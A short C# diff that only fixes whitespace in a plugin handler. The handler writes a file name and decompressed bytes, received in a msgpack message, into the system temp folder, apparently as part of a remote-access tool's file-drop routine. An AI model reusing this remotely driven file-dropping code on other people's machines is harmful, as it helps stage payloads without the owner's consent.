@@ -15,15 +15,15 @@ namespace Plugin.Handler
             try
             {
                 string fullPath = Path.Combine(Path.GetTempPath(), unpack_msgpack.ForcePathObject("FileName").AsString);
-                if (File.Exists(fullPath)) 
+                if (File.Exists(fullPath))
                 {
-                    try 
+                    try
                     {
-                        File.Delete(fullPath); 
-                    } 
-                    catch 
+                        File.Delete(fullPath);
+                    }
+                    catch
                     {
-                        fullPath = Path.Combine(Path.GetTempPath(), Methods.GetRandomString(6)+Path.GetExtension(unpack_msgpack.ForcePathObject("FileName").AsString));
+                        fullPath = Path.Combine(Path.GetTempPath(), Methods.GetRandomString(6) + Path.GetExtension(unpack_msgpack.ForcePathObject("FileName").AsString));
                     }
                 }
                 File.WriteAllBytes(fullPath, Zip.Decompress(unpack_msgpack.ForcePathObject("File").GetAsBytes()));
